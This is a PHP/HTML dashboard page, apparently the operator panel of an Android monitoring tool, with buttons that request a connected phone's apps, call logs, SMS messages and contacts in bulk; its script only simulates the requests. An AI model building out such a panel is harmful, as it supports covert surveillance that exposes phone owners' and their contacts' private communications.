    <link href="<?php echo base_url('assets/plugins/toastr/toastr.min.css'); ?>" rel="stylesheet" type="text/css"/>
    <!-- Content Wrapper. Contains page content -->
    <div class="content-wrapper">
        <!-- Content Header (Page header) -->
        <section class="content-header">
            <div class="container-fluid">
                <div class="row mb-4 align-items-center">
                    <div class="col-lg-8 col-md-6">
                        <div class="d-flex align-items-center">
                            <h1 class="h2 mb-0">
                                <i class="fas fa-mobile-alt text-primary mr-2"></i>
                                Device Command Center
                            </h1>
                            <div class="ml-3">
                                <span class="badge badge-light border p-2">
                                    <i class="fas fa-broadcast-tower text-primary mr-1"></i>
                                    Status: <b id="connectionStatus">Online</b>
                                </span>
                            </div>
                        </div>
                        <p class="text-muted mt-2 mb-0">Send commands and requests to your connected Android device</p>
                    </div>
                    <div class="col-lg-4 col-md-6">
                        <div class="float-right mt-2">
                            <button type="button" class="btn btn-primary" id="refreshConnection">
                                <i class="fas fa-sync-alt mr-1"></i> Refresh Connection
                            </button>
                            <button type="button" class="btn btn-outline-secondary ml-2" data-toggle="modal" data-target="#commandHistory">
                                <i class="fas fa-history mr-1"></i> History
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            <!-- /.container-fluid -->
        </section>

        <!-- Device Status Row -->
        <section class="content mb-4">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-md-12">
                        <div class="card card-primary">
                            <div class="card-body">
                                <div class="row">
                                    <div class="col-lg-3 col-6">
                                        <div class="info-box bg-light">
                                            <span class="info-box-icon bg-info">
                                                <i class="fas fa-signal"></i>
                                            </span>
                                            <div class="info-box-content">
                                                <span class="info-box-text">Connection Status</span>
                                                <span class="info-box-number">
                                                    <span class="badge badge-success" id="connectionBadge">Active</span>
                                                </span>
                                                <div class="progress">
                                                    <div class="progress-bar bg-success" style="width: 90%"></div>
                                                </div>
                                                <small class="text-muted">Last ping: <span id="lastPing">Just now</span></small>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-6">
                                        <div class="info-box bg-light">
                                            <span class="info-box-icon bg-success">
                                                <i class="fas fa-battery-full"></i>
                                            </span>
                                            <div class="info-box-content">
                                                <span class="info-box-text">Battery Level</span>
                                                <span class="info-box-number">
                                                    <span id="batteryLevel">85%</span>
                                                </span>
                                                <div class="progress">
                                                    <div class="progress-bar bg-success" style="width: 85%" id="batteryBar"></div>
                                                </div>
                                                <small class="text-muted">Last updated: <span id="batteryTime">5 min ago</span></small>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-6">
                                        <div class="info-box bg-light">
                                            <span class="info-box-icon bg-warning">
                                                <i class="fas fa-wifi"></i>
                                            </span>
                                            <div class="info-box-content">
                                                <span class="info-box-text">Network Type</span>
                                                <span class="info-box-number">
                                                    <span id="networkType">4G LTE</span>
                                                </span>
                                                <div class="progress">
                                                    <div class="progress-bar bg-warning" style="width: 70%"></div>
                                                </div>
                                                <small class="text-muted">Signal: <span id="signalStrength">Strong</span></small>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-lg-3 col-6">
                                        <div class="info-box bg-light">
                                            <span class="info-box-icon bg-danger">
                                                <i class="fas fa-microchip"></i>
                                            </span>
                                            <div class="info-box-content">
                                                <span class="info-box-text">Last Command</span>
                                                <span class="info-box-number">
                                                    <span id="lastCommand">None</span>
                                                </span>
                                                <div class="progress">
                                                    <div class="progress-bar bg-info" style="width: 60%"></div>
                                                </div>
                                                <small class="text-muted">Status: <span id="commandStatus">Ready</span></small>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Main content -->
        <section class="content">
            <div class="container-fluid">
                <div class="row">
                    <!-- Left Column - Commands -->
                    <div class="col-lg-8">
                        <div class="card card-primary card-outline">
                            <div class="card-header">
                                <h3 class="card-title">
                                    <i class="fas fa-terminal mr-2"></i>
                                    Available Commands
                                </h3>
                                <div class="card-tools">
                                    <div class="btn-group">
                                        <button type="button" class="btn btn-tool dropdown-toggle" data-toggle="dropdown">
                                            <i class="fas fa-cog"></i>
                                        </button>
                                        <div class="dropdown-menu dropdown-menu-right">
                                            <a class="dropdown-item" href="#" id="executeAllCommands"><i class="fas fa-play-circle mr-2"></i> Execute All</a>
                                            <div class="dropdown-divider"></div>
                                            <a class="dropdown-item" href="#" id="autoSchedule"><i class="fas fa-clock mr-2"></i> Auto Schedule</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="card-body">
                                <div class="row">
                                    <!-- Fetch Apps Command -->
                                    <div class="col-md-6 mb-4">
                                        <div class="card card-hover">
                                            <div class="card-header bg-info">
                                                <h3 class="card-title">
                                                    <i class="fab fa-android mr-2"></i>
                                                    Fetch Apps
                                                </h3>
                                                <div class="card-tools">
                                                    <span class="badge badge-light">
                                                        <i class="fas fa-clock mr-1"></i>
                                                        <span class="req_apps_last"><?php echo date('M d, H:i'); ?></span>
                                                    </span>
                                                </div>
                                            </div>
                                            <div class="card-body">
                                                <p class="card-text">
                                                    <small class="text-muted">
                                                        <i class="fas fa-info-circle mr-1"></i>
                                                        Request the Android device to fetch all installed applications
                                                    </small>
                                                </p>
                                                <div class="command-stats mb-3">
                                                    <div class="d-flex justify-content-between">
                                                        <small class="text-muted">
                                                            <i class="fas fa-database mr-1"></i>
                                                            Expected: <strong>100-500 apps</strong>
                                                        </small>
                                                        <small class="text-muted">
                                                            <i class="fas fa-clock mr-1"></i>
                                                            Time: <strong>30-60s</strong>
                                                        </small>
                                                    </div>
                                                </div>
                                                <button class="btn btn-block btn-info req_apps" data-command="apps">
                                                    <span class="req_apps_class">
                                                        <i class="fab fa-android mr-2"></i> Request Apps
                                                    </span>
                                                </button>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- Fetch Call Logs Command -->
                                    <div class="col-md-6 mb-4">
                                        <div class="card card-hover">
                                            <div class="card-header bg-success">
                                                <h3 class="card-title">
                                                    <i class="fas fa-phone-alt mr-2"></i>
                                                    Fetch Call Logs
                                                </h3>
                                                <div class="card-tools">
                                                    <span class="badge badge-light">
                                                        <i class="fas fa-clock mr-1"></i>
                                                        <span class="req_calls_last"><?php echo date('M d, H:i'); ?></span>
                                                    </span>
                                                </div>
                                            </div>
                                            <div class="card-body">
                                                <p class="card-text">
                                                    <small class="text-muted">
                                                        <i class="fas fa-info-circle mr-1"></i>
                                                        Request the Android device to fetch all call history and logs
                                                    </small>
                                                </p>
                                                <div class="command-stats mb-3">
                                                    <div class="d-flex justify-content-between">
                                                        <small class="text-muted">
                                                            <i class="fas fa-database mr-1"></i>
                                                            Expected: <strong>50-1000 calls</strong>
                                                        </small>
                                                        <small class="text-muted">
                                                            <i class="fas fa-clock mr-1"></i>
                                                            Time: <strong>15-30s</strong>
                                                        </small>
                                                    </div>
                                                </div>
                                                <button class="btn btn-block btn-success req_calls" data-command="calls">
                                                    <span class="req_calls_class">
                                                        <i class="fas fa-phone-alt mr-2"></i> Request Call Logs
                                                    </span>
                                                </button>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- Fetch SMS Command -->
                                    <div class="col-md-6 mb-4">
                                        <div class="card card-hover">
                                            <div class="card-header bg-warning">
                                                <h3 class="card-title">
                                                    <i class="fas fa-sms mr-2"></i>
                                                    Fetch SMS
                                                </h3>
                                                <div class="card-tools">
                                                    <span class="badge badge-light">
                                                        <i class="fas fa-clock mr-1"></i>
                                                        <span class="req_sms_last"><?php echo date('M d, H:i'); ?></span>
                                                    </span>
                                                </div>
                                            </div>
                                            <div class="card-body">
                                                <p class="card-text">
                                                    <small class="text-muted">
                                                        <i class="fas fa-info-circle mr-1"></i>
                                                        Request the Android device to fetch all SMS messages
                                                    </small>
                                                </p>
                                                <div class="command-stats mb-3">
                                                    <div class="d-flex justify-content-between">
                                                        <small class="text-muted">
                                                            <i class="fas fa-database mr-1"></i>
                                                            Expected: <strong>100-5000 SMS</strong>
                                                        </small>
                                                        <small class="text-muted">
                                                            <i class="fas fa-clock mr-1"></i>
                                                            Time: <strong>45-90s</strong>
                                                        </small>
                                                    </div>
                                                </div>
                                                <button class="btn btn-block btn-warning req_sms" data-command="sms">
                                                    <span class="req_sms_class">
                                                        <i class="fas fa-sms mr-2"></i> Request SMS
                                                    </span>
                                                </button>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- Fetch Contacts Command -->
                                    <div class="col-md-6 mb-4">
                                        <div class="card card-hover">
                                            <div class="card-header bg-purple">
                                                <h3 class="card-title">
                                                    <i class="fas fa-id-card mr-2"></i>
                                                    Fetch Contacts
                                                </h3>
                                                <div class="card-tools">
                                                    <span class="badge badge-light">
                                                        <i class="fas fa-clock mr-1"></i>
                                                        <span class="req_contacts_last"><?php echo date('M d, H:i'); ?></span>
                                                    </span>
                                                </div>
                                            </div>
                                            <div class="card-body">
                                                <p class="card-text">
                                                    <small class="text-muted">
                                                        <i class="fas fa-info-circle mr-1"></i>
                                                        Request the Android device to fetch all contacts
                                                    </small>
                                                </p>
                                                <div class="command-stats mb-3">
                                                    <div class="d-flex justify-content-between">
                                                        <small class="text-muted">
                                                            <i class="fas fa-database mr-1"></i>
                                                            Expected: <strong>50-500 contacts</strong>
                                                        </small>
                                                        <small class="text-muted">
                                                            <i class="fas fa-clock mr-1"></i>
                                                            Time: <strong>20-40s</strong>
                                                        </small>
                                                    </div>
                                                </div>
                                                <button class="btn btn-block btn-purple req_contacts" data-command="contacts">
                                                    <span class="req_contacts_class">
                                                        <i class="fas fa-id-card mr-2"></i> Request Contacts
                                                    </span>
                                                </button>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- Fetch All Data Command -->
                                    <div class="col-md-12 mb-4">
                                        <div class="card card-hover">
                                            <div class="card-header bg-danger">
                                                <h3 class="card-title">
                                                    <i class="fas fa-layer-group mr-2"></i>
                                                    Fetch All Data
                                                </h3>
                                                <div class="card-tools">
                                                    <span class="badge badge-light">
                                                        <i class="fas fa-clock mr-1"></i>
                                                        <span class="req_all_last"><?php echo date('M d, H:i'); ?></span>
                                                    </span>
                                                </div>
                                            </div>
                                            <div class="card-body">
                                                <div class="row">
                                                    <div class="col-md-8">
                                                        <p class="card-text">
                                                            <small class="text-muted">
                                                                <i class="fas fa-info-circle mr-1"></i>
                                                                Comprehensive data collection: Apps, Calls, SMS, and Contacts in one operation
                                                            </small>
                                                        </p>
                                                        <div class="command-stats mb-3">
                                                            <div class="d-flex justify-content-between">
                                                                <small class="text-muted">
                                                                    <i class="fas fa-database mr-1"></i>
                                                                    Total Data: <strong>All categories</strong>
                                                                </small>
                                                                <small class="text-muted">
                                                                    <i class="fas fa-clock mr-1"></i>
                                                                    Time: <strong>2-5 minutes</strong>
                                                                </small>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4">
                                                        <button class="btn btn-block btn-danger btn-lg req_all" data-command="all">
                                                            <span class="req_all_class">
                                                                <i class="fas fa-play-circle mr-2"></i> Execute Full Sync
                                                            </span>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Right Column - Device Requirements -->
                    <div class="col-lg-4">
                        <!-- Device Requirements -->
                        <div class="card card-info">
                            <div class="card-header">
                                <h3 class="card-title">
                                    <i class="fas fa-clipboard-check mr-2"></i>
                                    Requirements & Status
                                </h3>
                            </div>
                            <div class="card-body">
                                <h5 class="text-primary mb-3">
                                    <i class="fas fa-mobile-alt mr-2"></i> Device Requirements
                                </h5>
                                <ul class="list-unstyled">
                                    <li class="mb-3">
                                        <div class="d-flex align-items-center">
                                            <div class="mr-3">
                                                <span class="badge badge-success p-2">
                                                    <i class="fas fa-wifi"></i>
                                                </span>
                                            </div>
                                            <div>
                                                <div class="font-weight-bold">Internet Connection</div>
                                                <small class="text-muted">Device must have active internet access</small>
                                                <div class="mt-1">
                                                    <span class="badge badge-success" id="internetStatus">
                                                        <i class="fas fa-check-circle mr-1"></i> Connected
                                                    </span>
                                                </div>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="mb-3">
                                        <div class="d-flex align-items-center">
                                            <div class="mr-3">
                                                <span class="badge badge-warning p-2">
                                                    <i class="fas fa-shield-alt"></i>
                                                </span>
                                            </div>
                                            <div>
                                                <div class="font-weight-bold">Permissions</div>
                                                <small class="text-muted">All required permissions must be granted</small>
                                                <div class="mt-1">
                                                    <span class="badge badge-success" id="permissionStatus">
                                                        <i class="fas fa-check-circle mr-1"></i> Granted
                                                    </span>
                                                </div>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="mb-3">
                                        <div class="d-flex align-items-center">
                                            <div class="mr-3">
                                                <span class="badge badge-info p-2">
                                                    <i class="fas fa-battery-three-quarters"></i>
                                                </span>
                                            </div>
                                            <div>
                                                <div class="font-weight-bold">Battery Level</div>
                                                <small class="text-muted">Minimum 20% battery required</small>
                                                <div class="mt-1">
                                                    <span class="badge badge-success" id="batteryStatus">
                                                        <i class="fas fa-check-circle mr-1"></i> Sufficient
                                                    </span>
                                                </div>
                                            </div>
                                        </div>
                                    </li>
                                    <li>
                                        <div class="d-flex align-items-center">
                                            <div class="mr-3">
                                                <span class="badge badge-primary p-2">
                                                    <i class="fas fa-sync-alt"></i>
                                                </span>
                                            </div>
                                            <div>
                                                <div class="font-weight-bold">Background Service</div>
                                                <small class="text-muted">Monitoring service must be running</small>
                                                <div class="mt-1">
                                                    <span class="badge badge-success" id="serviceStatus">
                                                        <i class="fas fa-check-circle mr-1"></i> Active
                                                    </span>
                                                </div>
                                            </div>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <!-- Command History Modal -->
    <div class="modal fade" id="commandHistory" tabindex="-1" role="dialog" aria-labelledby="commandHistoryLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="commandHistoryLabel">
                        <i class="fas fa-history mr-2"></i>
                        Command History
                    </h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div class="table-responsive">
                        <table class="table table-hover">
                            <thead>
                            <tr>
                                <th>Command</th>
                                <th>Time</th>
                                <th>Status</th>
                                <th>Data Received</th>
                            </tr>
                            </thead>
                            <tbody id="historyTable">
                            <!-- History data would be loaded here -->
                            </tbody>
                        </table>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-danger" id="clearHistory">
                        <i class="fas fa-trash-alt mr-1"></i> Clear History
                    </button>
                </div>
            </div>
        </div>
    </div>

    <style>
        .card-hover {
            transition: all 0.3s ease;
            border: 1px solid #e9ecef;
        }

        .card-hover:hover {
            transform: translateY(-5px);
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            border-color: #007bff;
        }

        .bg-purple {
            background-color: #6f42c1 !important;
        }

        .btn-purple {
            background-color: #6f42c1;
            border-color: #6f42c1;
            color: white;
        }

        .btn-purple:hover {
            background-color: #5a32a3;
            border-color: #5a32a3;
        }

        .info-box {
            border-radius: 0.25rem;
            box-shadow: 0 0 1px rgba(0,0,0,.125), 0 1px 3px rgba(0,0,0,.2);
        }

        @media (max-width: 768px) {
            .card-header .card-title {
                font-size: 1.1rem;
            }

            .info-box {
                margin-bottom: 15px;
            }

            .command-stats .d-flex {
                flex-direction: column;
            }

            .command-stats small {
                margin-bottom: 5px;
            }
        }
    </style>

    <script src="<?php echo base_url('assets/plugins/toastr/toastr.min.js'); ?>"></script>
    <script>
        $(document).ready(function() {
            // Initialize toastr
            toastr.options = {
                "closeButton": true,
                "progressBar": true,
                "positionClass": "toast-top-right",
                "timeOut": "5000"
            };

            // Command execution
            $('.req_apps, .req_calls, .req_sms, .req_contacts, .req_all').click(function() {
                const button = $(this);
                const commandType = button.data('command');
                const buttonText = button.find('span');
                const originalText = buttonText.html();

                // Disable button and show loading
                button.prop('disabled', true);
                buttonText.html('<i class="fas fa-spinner fa-spin mr-2"></i> Processing...');

                // Simulate API call
                setTimeout(() => {
                    // Update last used time
                    const now = new Date();
                    const timeString = now.toLocaleDateString('en-US', {
                        month: 'short',
                        day: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit'
                    });

                    $(`.req_${commandType}_last`).text(timeString);

                    // Re-enable button
                    button.prop('disabled', false);
                    buttonText.html(originalText);

                    // Show success message
                    toastr.success(`${getCommandName(commandType)} request sent successfully!`, 'Command Executed');

                    // Update command status
                    $('#lastCommand').text(getCommandName(commandType));
                    $('#commandStatus').html('<span class="badge badge-success">Completed</span>');

                }, 2000);
            });

            // Execute all commands
            $('#executeAllCommands').click(function() {
                // Execute all commands sequentially
                const commands = [
                    { button: $('.req_apps'), type: 'apps' },
                    { button: $('.req_calls'), type: 'calls' },
                    { button: $('.req_sms'), type: 'sms' },
                    { button: $('.req_contacts'), type: 'contacts' }
                ];

                let delay = 0;
                commands.forEach((cmd, index) => {
                    setTimeout(() => {
                        cmd.button.click();
                    }, delay);
                    delay += 2500; // 2.5 second delay between commands
                });

                toastr.info('All commands have been queued for execution!', 'Commands Scheduled');
            });

            // Refresh connection
            $('#refreshConnection').click(function() {
                $(this).prop('disabled', true).html('<i class="fas fa-spinner fa-spin mr-1"></i> Checking...');

                setTimeout(() => {
                    $(this).prop('disabled', false).html('<i class="fas fa-sync-alt mr-1"></i> Refresh Connection');

                    // Update status
                    $('#connectionStatus').text('Online');
                    $('#connectionBadge').removeClass('badge-danger').addClass('badge-success').text('Active');
                    $('#lastPing').text('Just now');

                    toastr.info('Connection refreshed successfully!', 'Connection Status');
                }, 1500);
            });

            // Clear history
            $('#clearHistory').click(function() {
                $('#historyTable').html(`
                <tr>
                    <td colspan="4" class="text-center py-4">
                        <i class="fas fa-history fa-2x text-muted mb-3"></i>
                        <p class="text-muted">No command history</p>
                    </td>
                </tr>
            `);

                toastr.info('Command history cleared!', 'History Cleared');
            });

            // Helper functions
            function getCommandName(type) {
                const commands = {
                    'apps': 'Fetch Apps',
                    'calls': 'Fetch Call Logs',
                    'sms': 'Fetch SMS',
                    'contacts': 'Fetch Contacts',
                    'all': 'Fetch All Data'
                };
                return commands[type] || type;
            }

            // Simulate battery updates
            setInterval(() => {
                const battery = Math.floor(Math.random() * 30) + 70; // 70-100%
                $('#batteryLevel').text(battery + '%');
                $('#batteryBar').css('width', battery + '%');

                if (battery < 30) {
                    $('#batteryBar').removeClass('bg-success').addClass('bg-danger');
                    $('#batteryStatus').removeClass('badge-success').addClass('badge-danger')
                        .html('<i class="fas fa-exclamation-circle mr-1"></i> Low');
                } else if (battery < 50) {
                    $('#batteryBar').removeClass('bg-success').addClass('bg-warning');
                    $('#batteryStatus').removeClass('badge-success').addClass('badge-warning')
                        .html('<i class="fas fa-exclamation-triangle mr-1"></i> Moderate');
                } else {
                    $('#batteryBar').removeClass('bg-warning bg-danger').addClass('bg-success');
                    $('#batteryStatus').removeClass('badge-warning badge-danger').addClass('badge-success')
                        .html('<i class="fas fa-check-circle mr-1"></i> Sufficient');
                }

                // Update time
                const minutes = Math.floor(Math.random() * 10) + 1;
                $('#batteryTime').text(minutes + ' min ago');
            }, 30000);
        });
    </script>